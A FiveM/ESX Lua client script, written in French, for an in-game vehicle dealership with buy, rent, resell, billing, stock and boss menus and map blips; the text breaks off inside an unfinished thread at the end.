-------- [Base Template] dev par Freetz -------


local Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
	["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
	["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
	["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
	["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
	["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
	["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
	["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
	["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

local HasAlreadyEnteredMarker = false
local LastZone = {}

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local IsInShopMenu = false

local Categories = {}
local Vehicles = {}
local LastVehicles = {}
local CurrentVehicleData = nil

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()

	ESX.TriggerServerCallback('esx_vehicleshop:getCategories', function(categories)
		Categories = categories
	end)

	ESX.TriggerServerCallback('esx_vehicleshop:getVehicles', function(vehicles)
		Vehicles = vehicles
	end)

	if ConfigConCess.EnablePlayerManagement then
		for k, v in pairs(ConfigConCess.Society) do
			if ESX.PlayerData.job.name == k then
				ConfigConCess.Zones[k].ShopEntering.Type = 1

				if ESX.PlayerData.job.grade_name == 'boss' then
					ConfigConCess.Zones[k].BossActions.Type = 1
				end
			else
				ConfigConCess.Zones[k].ShopEntering.Type = -1
				ConfigConCess.Zones[k].BossActions.Type = -1
			end
		end
	end
end)

RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(xPlayer)
	ESX.PlayerData = xPlayer

	if ConfigConCess.EnablePlayerManagement then
		for k, v in pairs(ConfigConCess.Society) do
			if ESX.PlayerData.job.name == k then
				ConfigConCess.Zones[k].ShopEntering.Type = 1

				if ESX.PlayerData.job.grade_name == 'boss' then
					ConfigConCess.Zones[k].BossActions.Type = 1
				end
			else
				ConfigConCess.Zones[k].ShopEntering.Type = -1
				ConfigConCess.Zones[k].BossActions.Type = -1
			end
		end
	end
end)

RegisterNetEvent('esx_vehicleshop:sendCategories')
AddEventHandler('esx_vehicleshop:sendCategories', function(categories)
	Categories = categories
end)

RegisterNetEvent('esx_vehicleshop:sendVehicles')
AddEventHandler('esx_vehicleshop:sendVehicles', function(vehicles)
	Vehicles = vehicles
end)

function DeleteShopInsideVehicles()
	while #LastVehicles > 0 do
		local vehicle = LastVehicles[1]
		ESX.Game.DeleteVehicle(vehicle)
		table.remove(LastVehicles, 1)
	end
end

function ReturnVehicleProvider()
	ESX.TriggerServerCallback('esx_vehicleshop:getCommercialVehicles', function(vehicles)
		local elements = {}

		for i = 1, #vehicles, 1 do
			table.insert(elements, {
				label = vehicles[i].name,
				rightlabel = {'$' .. ESX.Math.GroupDigits(ESX.Math.Round(vehicles[i].price * 0.75))},
				value = vehicles[i].name
			})
		end
	
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'return_provider_menu', {
			title = _U('return_provider_menu'),
			elements = elements
		}, function(data, menu)
			TriggerServerEvent('esx_vehicleshop:returnProvider', data.current.value)
			Citizen.Wait(300)
			menu.close()

			ReturnVehicleProvider()
		end, function(data, menu)
		end)
	end, LastZone[1])
end

function StartShopRestriction()
	Citizen.CreateThread(function()
		while IsInShopMenu do
			interval = 10
	
			DisableControlAction(0, 75,  true) -- Disable exit vehicle
			DisableControlAction(27, 75, true) -- Disable exit vehicle

			Wait(10)
		end
	end)
end

function OpenConcessMenu()
	IsInShopMenu = true
	StartShopRestriction()

	local playerPed = PlayerPedId()

	FreezeEntityPosition(playerPed, true)
	SetEntityVisible(playerPed, false)
	SetEntityCoords(playerPed, ConfigConCess.Zones[LastZone[1]].ShopInside.Pos)

	local vehiclesByCategory = {}
	local elements = {}
	local firstVehicleData = nil

	for k, v in ipairs(Categories) do
		vehiclesByCategory[v.name] = {}
	end

	for k, v in ipairs(Vehicles) do
		if IsModelInCdimage(GetHashKey(v.model)) then
			table.insert(vehiclesByCategory[v.category], v)
		end
	end

	for k, v in ipairs(Categories) do
		if v.society == LastZone[1] then
			local options = {name = {}, description = {}}

			for k2, v2 in ipairs(vehiclesByCategory[v.name]) do
				if firstVehicleData == nil then
					firstVehicleData = v2
				end

				table.insert(options.name, v2.name)
				table.insert(options.description, 'Prix d\'achat : $~g~' .. ESX.Math.GroupDigits(v2.price))
			end

			table.insert(elements, {
				name = v.name,
				label = v.label,
				value = 1,
				type = 'list',
				options = options
			})
		end
	end

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_shop', {
		title = "concessionnaire",
		elements = elements
	}, function(data, menu)
		local vehicleData = vehiclesByCategory[data.current.name][data.current.value]

		
		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_confirm', {
			title = ("Acheter "..  vehicleData.name .." pour $".. ESX.Math.GroupDigits(vehicleData.price) .."?"),
			elements = {
				{label = "Non", value = 'no'},
				{label = "Oui", value = 'yes'}
			}
		}, function(data2, menu2)
			if data2.current.value == 'yes' then
				if ConfigConCess.EnablePlayerManagement then
					ESX.TriggerServerCallback('esx_vehicleshop:buyVehicleSociety', function(hasEnoughMoney)
						if hasEnoughMoney then
							IsInShopMenu = false
							DeleteShopInsideVehicles()
							local playerPed = PlayerPedId()

							CurrentAction = 'shop_menu'
							CurrentActionMsg = "Appuyez sur ~INPUT_CONTEXT~ pour accéder au menu"
							CurrentActionData = {}

							FreezeEntityPosition(playerPed, false)
							SetEntityVisible(playerPed, true)
							SetEntityCoords(playerPed, ConfigConCess.Zones[LastZone[1]].ShopEntering.Pos)

							menu2.close()
							menu.close()

							ESX.ShowNotification(_U('vehicle_purchased'))
						else
							ESX.ShowNotification("Vous n\avez pas assez d\'argent sur le compte de la societé")
						end
					end, LastZone[1], vehicleData.model)
				else
					local playerData = ESX.GetPlayerData()

					if ConfigConCess.EnableSocietyOwnedVehicles and playerData.job.grade_name == 'boss' then
						ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_confirm_buy_type', {
							title = "Type D\'achat",
							elements = {
								{label = "Personnel", value = 'personnal'},
								{label = "Societé", value = 'society'}
							}
						}, function(data3, menu3)
							if data3.current.value == 'personnal' then
								ESX.TriggerServerCallback('esx_vehicleshop:buyVehicle', function(hasEnoughMoney)
									if hasEnoughMoney then
										IsInShopMenu = false

										menu3.close()
										menu2.close()
										menu.close()

										DeleteShopInsideVehicles()

										ESX.Game.SpawnVehicle(vehicleData.model, ConfigConCess.Zones[LastZone[1]].ShopOutside.Pos, ConfigConCess.Zones[LastZone[1]].ShopOutside.Heading, function(vehicle)
											TaskWarpPedIntoVehicle(playerPed, vehicle, -1)

											local newPlate = GeneratePlate()
											local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
											vehicleProps.plate = newPlate
											SetVehicleNumberPlateText(vehicle, newPlate)

											if ConfigConCess.EnableOwnedVehicles then
												TriggerServerEvent('esx_vehicleshop:setVehicleOwned', vehicleProps, getVehicleType(vehicleProps.model))
											end

											ESX.ShowNotification(_U('vehicle_purchased'))
										end)

										FreezeEntityPosition(playerPed, false)
										SetEntityVisible(playerPed, true)
									else
										ESX.ShowNotification(_U('not_enough_money'))
									end
								end, vehicleData.model)
							elseif data3.current.value == 'society' then
								ESX.TriggerServerCallback('esx_vehicleshop:buyVehicleSociety', function(hasEnoughMoney)
									if hasEnoughMoney then
										IsInShopMenu = false

										menu3.close()
										menu2.close()
										menu.close()

										DeleteShopInsideVehicles()

										ESX.Game.SpawnVehicle(vehicleData.model, ConfigConCess.Zones[LastZone[1]].ShopOutside.Pos, ConfigConCess.Zones[LastZone[1]].ShopOutside.Heading, function(vehicle)
											TaskWarpPedIntoVehicle(playerPed, vehicle, -1)

											local newPlate = GeneratePlate()
											local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
											vehicleProps.plate = newPlate
											SetVehicleNumberPlateText(vehicle, newPlate)

											TriggerServerEvent('esx_vehicleshop:setVehicleOwnedSociety', playerData.job.name, vehicleProps, getVehicleType(vehicleProps.model))

											ESX.ShowNotification(_U('vehicle_purchased'))
										end)

										FreezeEntityPosition(playerPed, false)
										SetEntityVisible(playerPed, true)
									else
										ESX.ShowNotification("Vous n\avez pas assez d\'argent sur le compte de la societé")
									end
								end, playerData.job.name, vehicleData.model)
							end
						end, function(data3, menu3)
						end)
					else
						ESX.TriggerServerCallback('esx_vehicleshop:buyVehicle', function(hasEnoughMoney)
							if hasEnoughMoney then
								IsInShopMenu = false

								menu2.close()
								menu.close()

								DeleteShopInsideVehicles()

								ESX.Game.SpawnVehicle(vehicleData.model, ConfigConCess.Zones[LastZone[1]].ShopOutside.Pos, ConfigConCess.Zones[LastZone[1]].ShopOutside.Heading, function(vehicle)
									TaskWarpPedIntoVehicle(playerPed, vehicle, -1)

									local newPlate = GeneratePlate()
									local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
									vehicleProps.plate = newPlate
									SetVehicleNumberPlateText(vehicle, newPlate)

									if ConfigConCess.EnableOwnedVehicles then
										TriggerServerEvent('esx_vehicleshop:setVehicleOwned', vehicleProps, getVehicleType(vehicleProps.model))
									end

									ESX.ShowNotification(_U('vehicle_purchased'))
								end)

								FreezeEntityPosition(playerPed, false)
								SetEntityVisible(playerPed, true)
							else
								ESX.ShowNotification(_U('not_enough_money'))
							end
						end, vehicleData.model)
					end
				end
			end
		end, function(data2, menu2)
		end)
	end, function(data, menu)
		DeleteShopInsideVehicles()
		local playerPed = PlayerPedId()

		CurrentAction = 'shop_menu'
		CurrentActionMsg = "Appuyez sur ~INPUT_CONTEXT~ pour accéder au menu"
		CurrentActionData = {}

		FreezeEntityPosition(playerPed, false)
		SetEntityVisible(playerPed, true)
		SetEntityCoords(playerPed, ConfigConCess.Zones[LastZone[1]].ShopEntering.Pos)

		IsInShopMenu = false
	end, function(data, menu)
		local vehicleData = vehiclesByCategory[data.current.name][data.current.value]
		local playerPed = PlayerPedId()

		DeleteShopInsideVehicles()
		WaitForVehicleToLoad(vehicleData.model)

		ESX.Game.SpawnLocalVehicle(vehicleData.model, ConfigConCess.Zones[LastZone[1]].ShopInside.Pos, ConfigConCess.Zones[LastZone[1]].ShopInside.Heading, function(vehicle)
			table.insert(LastVehicles, vehicle)
			TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
			FreezeEntityPosition(vehicle, true)
		end)
	end)

	DeleteShopInsideVehicles()
	WaitForVehicleToLoad(firstVehicleData.model)

	ESX.Game.SpawnLocalVehicle(firstVehicleData.model, ConfigConCess.Zones[LastZone[1]].ShopInside.Pos, ConfigConCess.Zones[LastZone[1]].ShopInside.Heading, function(vehicle)
		table.insert(LastVehicles, vehicle)
		TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
		FreezeEntityPosition(vehicle, true)
	end)
end

function WaitForVehicleToLoad(modelHash)
	modelHash = (type(modelHash) == 'number' and modelHash or GetHashKey(modelHash))

	if not HasModelLoaded(modelHash) then
		RequestModel(modelHash)

		while not HasModelLoaded(modelHash) do
			Citizen.Wait(1)

			DisableControlAction(0, Keys['TOP'], true)
			DisableControlAction(0, Keys['DOWN'], true)
			DisableControlAction(0, Keys['LEFT'], true)
			DisableControlAction(0, Keys['RIGHT'], true)
			DisableControlAction(0, 176, true) -- ENTER key
			DisableControlAction(0, Keys['BACKSPACE'], true)

			drawLoadingText(_U('shop_awaiting_model'), 255, 255, 255, 255)
		end
	end
end

function OpenResellerMenu()
	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'reseller', {
		title = "concessionnaire",
		elements = {
			{label = "Acheter un Véhicule", value = 'buy_vehicle'},
			{label = "Sortir un Véhicule", value = 'pop_vehicle'},
			{label = "Rentrer un véhiule", value = 'depop_vehicle'},
			{label = "Créer une facture", value = 'create_bill'},
			{label = "Véhicules en location", value = 'get_rented_vehicles'},
			{label = "Attribuer véhicule - [~r~VENTE~s~]", value = 'set_vehicle_owner_sell'},
			{label = "Attribuer véhicule - [~b~LOCATION~s~]", value = 'set_vehicle_owner_rent'},
			{label = "Attribuer véhicule - [~g~Vente Société~s~]", value = 'set_vehicle_owner_sell_society'},
			{label = "Déposer Stock", value = 'put_stock'},
			{label = "Prendre Stock", value = 'get_stock'}
		}
	}, function(data, menu)
		local action = data.current.value

		if action == 'buy_vehicle' then
			OpenConcessMenu()
		elseif action == 'put_stock' then
			OpenPutStocksMenu()
		elseif action == 'get_stock' then
			OpenGetStocksMenu()
		elseif action == 'pop_vehicle' then
			OpenPopVehicleMenu()
		elseif action == 'depop_vehicle' then
			DeleteShopInsideVehicles()
		elseif action == 'return_provider' then
			ReturnVehicleProvider()
		elseif action == 'create_bill' then
			local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()
			if closestPlayer == -1 or closestDistance > 3.0 then
				ESX.ShowNotification("~r~Aucun Joueurs aux alentours !")
				return
			end

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'set_vehicle_owner_sell_amount', {
				title = "montant de la facture"
			}, function(data2, menu2)
				local amount = tonumber(data2.value)

				if amount == nil then
					ESX.ShowNotification("Montant invalide")
				else
					menu2.close()
					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

					if closestPlayer == -1 or closestDistance > 3.0 then
						ESX.ShowNotification("~r~Aucun Joueurs aux alentours !")
					else
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(closestPlayer), 'society_' .. ESX.PlayerData.job.name, "concessionnaire", tonumber(data2.value))
						TriggerServerEvent('freetz:logs:concess:facture', tonumber(data2.value))
					end
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		elseif action == 'get_rented_vehicles' then
			OpenRentedVehiclesMenu()
		elseif action == 'set_vehicle_owner_sell' then
			local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

			if closestPlayer == -1 or closestDistance > 3.0 then
				ESX.ShowNotification("~r~Aucun Joueurs aux alentours !")
			else
				local newPlate = GeneratePlate()
				local vehicleProps = ESX.Game.GetVehicleProperties(LastVehicles[#LastVehicles])
				local model = CurrentVehicleData.model
				vehicleProps.plate = newPlate
				SetVehicleNumberPlateText(LastVehicles[#LastVehicles], newPlate)

				TriggerServerEvent('esx_vehicleshop:sellVehicle', model)
				TriggerServerEvent('esx_vehicleshop:addToList', GetPlayerServerId(closestPlayer), model, newPlate, LastZone[1])

				if ConfigConCess.EnableOwnedVehicles then
					TriggerServerEvent('esx_vehicleshop:setVehicleOwnedPlayerId', GetPlayerServerId(closestPlayer), vehicleProps, getVehicleType(vehicleProps.model))
					ESX.ShowNotification("le véhicule ~y~".. vehicleProps.plate .."~s~ a été attribué à ~g~".. GetPlayerName(closestPlayer) .."~s~'")
				else
					ESX.ShowNotification("véhicule ~y~".. vehicleProps.plate .."~s~ vendu à ~b~".. GetPlayerName(closestPlayer) .."~s~")
				end
			end
		elseif action == 'set_vehicle_owner_sell_society' then
			local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

			if closestPlayer == -1 or closestDistance > 3.0 then
				ESX.ShowNotification("~r~Aucun Joueurs aux alentours !")
			else
				menu.close()

				ESX.TriggerServerCallback('esx:getOtherPlayerData', function(xPlayer)
					local newPlate = GeneratePlate()
					local vehicleProps = ESX.Game.GetVehicleProperties(LastVehicles[#LastVehicles])
					local model = CurrentVehicleData.model
					vehicleProps.plate = newPlate
					SetVehicleNumberPlateText(LastVehicles[#LastVehicles], newPlate)

					TriggerServerEvent('esx_vehicleshop:sellVehicle', model)
					TriggerServerEvent('esx_vehicleshop:addToList', GetPlayerServerId(closestPlayer), model, newPlate, LastZone[1])

					if ConfigConCess.EnableSocietyOwnedVehicles then
						TriggerServerEvent('esx_vehicleshop:setVehicleOwnedSociety', xPlayer.job.name, vehicleProps, getVehicleType(vehicleProps.model))
						ESX.ShowNotification("le véhicule ~y~".. vehicleProps.plate .."~s~ a été attribué à ~b~".. GetPlayerName(closestPlayer) .."~s~")
					else
						ESX.ShowNotification("Véhicule ~y~".. vehicleProps.plate .."~s~ vendu à ~b~".. GetPlayerName(closestPlayer) .."~s")
					end
				end, GetPlayerServerId(closestPlayer))
			end
		elseif action == 'set_vehicle_owner_rent' then
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'set_vehicle_owner_rent_amount', {
				title = "Montant de la location"
			}, function(data2, menu2)
				local amount = tonumber(data2.value)

				if amount == nil then
					ESX.ShowNotification("Montant invalide")
				else
					menu2.close()

					local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

					if closestPlayer == -1 or closestDistance > 5.0 then
						ESX.ShowNotification("~r~Aucun Joueurs aux alentours !")
					else
						local newPlate = 'RENT' .. string.upper(ESX.GetRandomString(4))
						local vehicleProps = ESX.Game.GetVehicleProperties(LastVehicles[#LastVehicles])
						local model = CurrentVehicleData.model
						vehicleProps.plate = newPlate
						SetVehicleNumberPlateText(LastVehicles[#LastVehicles], newPlate)
						TriggerServerEvent('esx_vehicleshop:rentVehicle', model, vehicleProps.plate, GetPlayerName(closestPlayer), CurrentVehicleData.price, amount, GetPlayerServerId(closestPlayer), LastZone[1])

						if ConfigConCess.EnableOwnedVehicles then
							TriggerServerEvent('esx_vehicleshop:setVehicleOwnedPlayerId', GetPlayerServerId(closestPlayer), vehicleProps, getVehicleType(vehicleProps.model))
						end

						ESX.ShowNotification("le véhicule ~y~".. vehicleProps.plate .."~s~ a été loué à ~b~".. GetPlayerName(closestPlayer) .."~s~")
						TriggerServerEvent('esx_vehicleshop:setVehicleForAllPlayers', vehicleProps, ConfigConCess.Zones[LastZone[1]].ShopInside.Pos, 5.0)
					end
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end
	end, function(data, menu)
		CurrentAction = 'reseller_menu'
		CurrentActionMsg = "Appuyez sur ~INPUT_CONTEXT~ pour accéder au menu"
		CurrentActionData = {}
	end)
end

function OpenPopVehicleMenu()
	ESX.TriggerServerCallback('esx_vehicleshop:getCommercialVehicles', function(vehicles)
		local elements = {}

		for i = 1, #vehicles, 1 do
			table.insert(elements, {
				label = vehicles[i].name,
				rightlabel = {'$' .. ESX.Math.GroupDigits(vehicles[i].price)},
				value = vehicles[i].name
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'commercial_vehicles', {
			title = "Concessionnaire - Véhicules",
			elements = elements
		}, function(data, menu)
			local model = data.current.value
			DeleteShopInsideVehicles()

			ESX.Game.SpawnVehicle(model, ConfigConCess.Zones[LastZone[1]].ShopOutside.Pos, ConfigConCess.Zones[LastZone[1]].ShopOutside.Heading, function(vehicle)
				table.insert(LastVehicles, vehicle)

				for i = 1, #Vehicles, 1 do
					if model == Vehicles[i].model then
						CurrentVehicleData = Vehicles[i]
						break
					end
				end
			end)
		end, function(data, menu)
		end)
	end, LastZone[1])
end

function OpenRentedVehiclesMenu()
	ESX.TriggerServerCallback('esx_vehicleshop:getRentedVehicles', function(vehicles)
		local elements = {}

		for i = 1, #vehicles, 1 do
			table.insert(elements, {
				label = ('%s: %s'):format(vehicles[i].playerName, vehicles[i].name),
				rightlabel = {'[' .. ESX.Math.GroupDigits(vehicles[i].plate) .. ']'},
				value = vehicles[i].name
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'rented_vehicles', {
			title = "Concessionnaire - Véhicules en location",
			elements = elements
		}, nil, function(data, menu)
		end)
	end, LastZone[1])
end

function OpenBossActionsMenu()
	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'reseller', {
		title = "Concessionnaire - Patron",
		elements = {
			{label = "Actions du Chef", value = 'boss_actions'},
			{label = "~r~Liste des véhicule vendu", value = 'sold_vehicles'}
		}
	}, function(data, menu)
		if data.current.value == 'boss_actions' then
			TriggerEvent('esx_society:openBossMenu', LastZone[1], function(data, menu) end)
		elseif data.current.value == 'sold_vehicles' then
			ESX.TriggerServerCallback('esx_vehicleshop:getSoldVehicles', function(customers)
				local elements = {
					head = { "Nom du Client", "Modèle de Véhicule", "Plaque D\'immatriculation", "Votre véhicule à été vendu par", "Date" },
					rows = {}
				}
		
				for i = 1, #customers, 1 do
					table.insert(elements.rows, {
						data = customers[i],
						cols = {
							customers[i].client,
							customers[i].model,
							customers[i].plate,
							customers[i].soldby,
							customers[i].date
						}
					})
				end

				ESX.UI.Menu.Open('list', GetCurrentResourceName(), 'sold_vehicles', elements, function(data2, menu2)
				end, function(data2, menu2)
					menu2.close()
				end)
			end, LastZone[1])
		end
	end, function(data, menu)
		CurrentAction = 'boss_actions_menu'
		CurrentActionMsg = "Appuyez sur ~INPUT_CONTEXT~ pour accéder au menu"
		CurrentActionData = {}
	end)
end

function OpenGetStocksMenu()
	ESX.TriggerServerCallback('esx_vehicleshop:getStockItems', function(items)
		local elements = {}

		for i = 1, #items, 1 do
			table.insert(elements, {
				label = items[i].label,
				rightlabel = {'(' .. items[i].count .. ')'},
				value = items[i].name
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = "Concession - Stock",
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count', {
				title = _U('amount')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification("~r~Quantité Invalide")
				else
					TriggerServerEvent('esx_vehicleshop:getStockItem', LastZone[1], itemName, count)
					menu2.close()
					menu.close()
					OpenGetStocksMenu()
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end, LastZone[1])
end

function OpenPutStocksMenu()
	ESX.TriggerServerCallback('esx_vehicleshop:getPlayerInventory', function(inventory)
		local elements = {}

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {
					label = item.label,
					rightlabel = {'(' .. item.count .. ')'},
					type = 'item_standard',
					value = item.name
				})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = "inventaire",
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
				title = "quantité"
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification("~r~Quantité Invalide")
				else
					TriggerServerEvent('esx_vehicleshop:putStockItems', LastZone[1], itemName, count)
					menu2.close()
					menu.close()
					OpenPutStocksMenu()
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

RegisterNetEvent('esx:setJob')
AddEventHandler('esx:setJob', function (job)
	ESX.PlayerData.job = job

	if ConfigConCess.EnablePlayerManagement then
		for k, v in pairs(ConfigConCess.Society) do
			if ESX.PlayerData.job.name == k then
				ConfigConCess.Zones[k].ShopEntering.Type = 1

				if ESX.PlayerData.job.grade_name == 'boss' then
					ConfigConCess.Zones[k].BossActions.Type = 1
				end
			else
				ConfigConCess.Zones[k].ShopEntering.Type = -1
				ConfigConCess.Zones[k].BossActions.Type = -1
			end
		end
	end
end)

AddEventHandler('esx_vehicleshop:hasEnteredMarker', function(zone)
	if zone[2] == 'ShopEntering' then
		if ConfigConCess.EnablePlayerManagement then
			if ESX.PlayerData.job ~= nil and ESX.PlayerData.job.name == zone[1] then
				CurrentAction = 'reseller_menu'
				CurrentActionMsg = "Appuyez sur ~INPUT_CONTEXT~ pour accéder au menu"
				CurrentActionData = {}
			end
		else
			CurrentAction = 'shop_menu'
			CurrentActionMsg = "Appuyez sur ~INPUT_CONTEXT~ pour accéder au menu"
			CurrentActionData = {}
		end
	elseif zone[2] == 'GiveBackVehicle' and ConfigConCess.EnablePlayerManagement then
		local playerPed = PlayerPedId()

		if IsPedInAnyVehicle(playerPed, false) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)

			CurrentAction = 'give_back_vehicle'
			CurrentActionMsg = "Appuyez sur ~INPUT_CONTEXT~ pour rendre votre véhicule"

			CurrentActionData = {
				vehicle = vehicle
			}
		end
	elseif zone[2] == 'ResellVehicle' then
		local playerPed = PlayerPedId()

		if IsPedSittingInAnyVehicle(playerPed) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)
			local vehicleData, model, resellPrice, plate

			if GetPedInVehicleSeat(vehicle, -1) == playerPed then
				for i = 1, #Vehicles, 1 do
					if GetHashKey(Vehicles[i].model) == GetEntityModel(vehicle) then
						vehicleData = Vehicles[i]
						break
					end
				end
	
				resellPrice = ESX.Math.Round(vehicleData.price / 100 * ConfigConCess.ResellPercentage)
				model = GetEntityModel(vehicle)
				plate = ESX.Math.Trim(GetVehicleNumberPlateText(vehicle))
	
				CurrentAction = 'resell_vehicle'
				CurrentActionMsg = ("appuyez sur ~INPUT_CONTEXT~ pour vendre ~y~".. vehicleData.name .."~s~ au prix de ~g~$".. ESX.Math.GroupDigits(resellPrice) .."~s~")
	
				CurrentActionData = {
					vehicle = vehicle,
					label = vehicleData.name,
					price = resellPrice,
					model = model,
					plate = plate
				}
			end
		end
	elseif zone[2] == 'BossActions' and ConfigConCess.EnablePlayerManagement and ESX.PlayerData.job ~= nil and ESX.PlayerData.job.name == zone[1] and ESX.PlayerData.job.grade_name == 'boss' then
		CurrentAction = 'boss_actions_menu'
		CurrentActionMsg = "Appuyez sur ~INPUT_CONTEXT~ pour accéder au menu"
		CurrentActionData = {}
	end
end)

AddEventHandler('esx_vehicleshop:hasExitedMarker', function(zone)
	if not IsInShopMenu then
		ESX.UI.Menu.CloseAll()
	end

	CurrentAction = nil
end)

AddEventHandler('onResourceStop', function(resource)
	if resource == GetCurrentResourceName() then
		if IsInShopMenu then
			ESX.UI.Menu.CloseAll()

			DeleteShopInsideVehicles()

			local playerPed = PlayerPedId()

			FreezeEntityPosition(playerPed, false)
			SetEntityVisible(playerPed, true)
			SetEntityCoords(playerPed, ConfigConCess.Zones.ShopEntering.Pos)
		end
	end
end)

-- Create Blips
--Citizen.CreateThread(function()
--	for k, v in pairs(ConfigConCess.Blips) do
--		local blip = AddBlipForCoord(v.Pos)
--
--		SetBlipSprite(blip, v.Sprite)
--		SetBlipDisplay(blip, 4)
--		SetBlipScale(blip, 0.8)
--		SetBlipAsShortRange(blip, true)
--
--		--BeginTextCommandSetBlipName("STRING")
--		AddTextComponentSubstringPlayerName(v.Name)
--		EndTextCommandSetBlipName(blip)
--	end
--end)

Citizen.CreateThread(function() 
	local blip = AddBlipForCoord(-37.7346, -1107.5588, 26.4365)

	SetBlipSprite(blip, 326)
	SetBlipDisplay(blip, 4)
	SetBlipScale(blip, 0.8)
	SetBlipAsShortRange(blip, true) 
	BeginTextCommandSetBlipName('STRING') 
	AddTextComponentSubstringPlayerName("Concessionnaire Voitures")
	EndTextCommandSetBlipName(blip) 
	SetBlipCategory(blip, 10)
end)

Citizen.CreateThread(function() 
	local blip2 = AddBlipForCoord(-816.4496, -1345.9592, 5.1504)

	SetBlipSprite(blip2, 326)
	SetBlipDisplay(blip2, 4)
	SetBlipScale(blip2, 0.8)
	SetBlipAsShortRange(blip2, true) 
	BeginTextCommandSetBlipName('STRING') 
	AddTextComponentSubstringPlayerName("Concessionnaire Bateaux")
	EndTextCommandSetBlipName(blip2) 
	SetBlipCategory(blip2, 10)
end)

Citizen.CreateThread(function() 
	local blip3 = AddBlipForCoord(-941.273, -2954.613, 12.895)

	SetBlipSprite(blip3, 326)
	SetBlipDisplay(blip3, 4)
	SetBlipScale(blip3, 0.8)
	SetBlipAsShortRange(blip3, true) 
	BeginTextCommandSetBlipName('STRING')
	AddTextComponentSubstringPlayerName("Concessionnaire Avions")
	EndTextCommandSetBlipName(blip3)
	SetBlipCategory(blip3, 10)
end)

Citizen.CreateThread(function() 
	local blip5 = AddBlipForCoord(242.718, -392.356, 46.305)

	SetBlipSprite(blip5, 431)
	SetBlipDisplay(blip5, 4)
	SetBlipScale(blip5, 0.8)
	SetBlipColour(blip5, 52)
	SetBlipAsShortRange(blip5, true) 
	BeginTextCommandSetBlipName('STRING')
	AddTextComponentSubstringPlayerName("Investisseur")
	EndTextCommandSetBlipName(blip5)
end)

Citizen.CreateThread(function() 
	local blip6 = AddBlipForCoord(-798.9081, -589.1970, 30.1263)

	SetBlipSprite(blip6, 304)
	SetBlipDisplay(blip6, 4)
	SetBlipScale(blip6, 0.8)
	SetBlipColour(blip6, 48)
	SetBlipAsShortRange(blip6, true) 
	BeginTextCommandSetBlipName('STRING')
	AddTextComponentSubstringPlayerName("Magasin D\'Accessoires")
	EndTextCommandSetBlipName(blip6)
end)

Citizen.CreateThread(function() 
